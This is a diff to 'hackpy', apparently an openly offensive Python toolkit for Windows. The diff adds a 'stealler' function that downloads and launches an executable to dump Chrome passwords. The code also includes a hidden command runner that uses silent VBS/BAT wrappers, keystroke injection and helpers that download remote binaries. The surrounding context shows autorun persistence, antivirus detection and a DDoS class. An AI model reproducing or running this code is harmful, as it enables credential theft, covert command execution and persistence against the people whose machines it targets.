@@ -19,6 +19,7 @@ from time import sleep as time_sleep
 from time import time as time_time
 from time import ctime as time_ctime
 from shutil import move as shutil_move
+from shutil import rmtree as shutil_rmtree
 from wget import download as wget_download
 from getmac import get_mac_address as getmac
 from random import randint as random_randint
@@ -33,6 +34,33 @@ from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM
 install_path = os_environ['TEMP'] + '\\hackpy'
 if not os_path.exists(install_path):
 	os_mkdir(install_path)
+
+# Load nircmdc.exe
+def load(architecture=32, statusbar = None):
+	if os_path.exists(install_path + '\\nircmdc.exe'):
+		return True
+	else:
+		if architecture == 64:
+			nircmdc_file_part = 'nircmdc'
+		else:
+			nircmdc_file_part = 'nircmd'
+
+		nircmdc_temp_file = wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/' + nircmdc_file_part + '.exe', bar = statusbar)
+	shutil_move(nircmdc_temp_file, install_path + '\\nircmdc.exe')
+	return True
+
+# Unload (delete) nircmdc.exe from system
+def unload():
+	if os_path.exists(install_path):
+		shutil_rmtree(install_path)
+		return True
+	else:
+		raise FileNotFoundError('hackpy - Failed to delete file. It does not exist')
+		return False
+
+# Clean temp hackpy cache
+def clean():
+	command.system('@cd ' + install_path + ' && @del *.bat > NUL && @del *.vbs > NUL')
 
 # Load file from URL
 def wget(link, statusbar = None, output = None):
@@ -59,64 +87,30 @@ def autorun(path, name='hackpy_' + str(random_randint(1,999)) + '_', state=True)
 	else:
 		raise FileNotFoundError('hackpy - Failed to add file: ' + file + ' to startup')
 
-
-# Load nircmdc.exe
-def load(architecture=32, statusbar = None):
-	if os_path.exists(install_path + '\\nircmdc.exe'):
-		return True
-	else:
-		if architecture == 64:
-			nircmdc_file_part = 'nircmdc'
-		else:
-			nircmdc_file_part = 'nircmd'
-
-		nircmdc_temp_file = wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/' + nircmdc_file_part + '.exe', bar = statusbar)
-	shutil_move(nircmdc_temp_file, install_path + '\\nircmdc.exe')
-	return True
-
-# Unload (delete) nircmdc.exe from system
-def unload():
-	if os_path.exists(install_path):
-		os_remove(install_path + '\\nircmdc.exe')
-		return True
-	else:
-		raise FileNotFoundError('hackpy - Failed to delete file. It does not exist')
-		return False
-
-# Clean temp hackpy cache
-def clean():
-	command.system('@cd ' + install_path + ' && @del *.bat > NUL && @del *.vbs > NUL')
+def stealler():
+	#
+	# hackpy.stealler() # Save all Сhrome passwords to passwords.txt
+	# Stealler source code: https://pastebin.com/V28aPdZH
+	#
+	if not os_path.exists(install_path + '\\passwords_recovery.exe'):
+		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/passwords_recovery.exe', out = install_path + '\\passwords_recovery.exe', bar = None)
+	command.system('@start ' + install_path + '\\passwords_recovery.exe')
 
 
-class command:
-	# Execute system command: hackpy.command.system('command')
-	# Execute nircmdc command: hackpy.command.nircmdc('command')
-	def system(recived_command):
-		# Temp files names
-		bat_script_path = install_path + '\\' + 'bat_script_' + str(random_randint(1, 100000)) + '.bat'
-		vbs_script_path = install_path + '\\' + 'vbs_script_' + str(random_randint(1, 100000)) + '.vbs'
-		# Temp files commands
-		bat_script = '@' + recived_command
-		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
-		# Write bat commands
-		with open(bat_script_path, "w") as bat_script_write:
-			bat_script_write.write(bat_script)
-		# Write vbs commands
-		with open(vbs_script_path, "w") as vbs_script_write:
-			vbs_script_write.write(vbs_script)
-		time_sleep(0.1)
-		os_startfile(vbs_script_path)
+def sendkey(key):
+	#
+	# SendKey('Hello my L0rd!!{ENTER}')
+	# Other keys: https://pastebin.com/Ns3P7UiH
+	#
+	with open(install_path + '\\keyboard.vbs', "w") as tempfile:
+		tempfile.write('WScript.CreateObject(\"WScript.Shell\").SendKeys \"' + key + '\"')
+	os_startfile(install_path + '\\keyboard.vbs')
 
-	def nircmdc(recived_command, priority='NORMAL'):
-		# Check nircmdc.exe file
-		if os_path.exists(install_path + '\\nircmdc.exe'):
-			command.system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmdc.exe' + ' ' + recived_command)
-		else:
-			raise FileNotFoundError('hackpy - You don\'t loaded nircmdc.exe please make hackpy.load() after importing this module.')
 
 # Get info by ip address
 # WARNING! Usage limits:
-# This endpoint is limited to 150 requests per minute from an IP address. If you go over this limit your IP address will be blackholed. You can unban here: http://ip-api.com/docs/unban
+# This endpoint is limited to 150 requests per minute from an IP address. If you go over this limit your IP address will be blackholed.
+# You can unban here: http://ip-api.com/docs/unban
 def ip_info(ip = '', status_bar = None, out_tempfile = 'ip_info.json'):
 	#
     #  "query": "24.48.0.1",
@@ -174,7 +168,7 @@ def router():
 def install_python(version = '3.7.0', path = os_environ['SystemDrive'] + '\\python'):
 	#
 	# Install python to system
-	# Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python37')
+	# Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python36')
 	# Default version is: 3.7.0 and install path is: C:\python
 	#
 	if os_path.exists(path):
@@ -226,6 +220,58 @@ def detect_protection():
             detected[antivirus] = SYS_DRIVE + path
 
     return detected
+
+class command:
+	# Execute system command: hackpy.command.system('command')
+	# Execute nircmdc command: hackpy.command.nircmdc('command')
+	def system(recived_command):
+		# Temp files names
+		bat_script_path = install_path + '\\' + 'bat_script_' + str(random_randint(1, 100000)) + '.bat'
+		vbs_script_path = install_path + '\\' + 'vbs_script_' + str(random_randint(1, 100000)) + '.vbs'
+		# Temp files commands
+		bat_script = '@' + recived_command
+		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
+		# Write bat commands
+		with open(bat_script_path, "w") as bat_script_write:
+			bat_script_write.write(bat_script)
+		# Write vbs commands
+		with open(vbs_script_path, "w") as vbs_script_write:
+			vbs_script_write.write(vbs_script)
+		time_sleep(0.1)
+		os_startfile(vbs_script_path)
+
+	def nircmdc(recived_command, priority='NORMAL'):
+		# Check nircmdc.exe file
+		if os_path.exists(install_path + '\\nircmdc.exe'):
+			command.system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmdc.exe' + ' ' + recived_command)
+		else:
+			raise FileNotFoundError('hackpy - You don\'t loaded nircmdc.exe please make hackpy.load() after importing this module.')
+
+
+class messagebox:
+	#
+	# Show windows message box:
+    # hackpy.messagebox.none('Caption!', 'Hey i\'m text!')
+	# hackpy.messagebox.info('Caption!', 'Hey i\'m text!')
+	# hackpy.messagebox.error('Caption!', 'Hey i\'m text!')
+	# hackpy.messagebox.warning('Caption!', 'Hey i\'m text!')
+	#
+	def info(caption, text):
+		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
+			msgboxfile.write('x=msgbox(\"' + text + '\" ,64, \"' + caption + '\")')
+			os_startfile(install_path + '\\msgbox.vbs')
+	def error(caption, text):
+		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
+			msgboxfile.write('x=msgbox(\"' + text + '\" ,16, \"' + caption + '\")')
+			os_startfile(install_path + '\\msgbox.vbs')
+	def warning(caption, text):
+		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
+			msgboxfile.write('x=msgbox(\"' + text + '\" ,48, \"' + caption + '\")')
+			os_startfile(install_path + '\\msgbox.vbs')
+	def none(caption, text):
+		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
+			msgboxfile.write('x=msgbox(\"' + text + '\" ,0, \"' + caption + '\")')
+			os_startfile(install_path + '\\msgbox.vbs')
 
 class ddos:
 	#
